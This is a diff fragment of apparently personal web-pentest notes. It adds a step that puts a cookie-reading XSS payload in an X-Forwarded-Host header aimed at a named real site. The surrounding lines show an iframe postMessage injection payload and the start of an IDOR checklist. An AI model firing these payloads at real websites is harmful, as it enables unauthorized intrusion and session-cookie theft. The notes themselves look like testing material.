@@ -322,6 +322,12 @@ login
 - if found parseing {} with type load_channel
 <iframe src="https://site.com/"onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
 
+- Send the request to Repeater add X-Forwarded-Host: bing.com"><img src/onerror=prompt(document.cookie)> below Host: www.omise.co
+
+
+
+
+
 ------------------------------------------------------------
 IDOR :: 
   GO to my account and intercept data then change id 
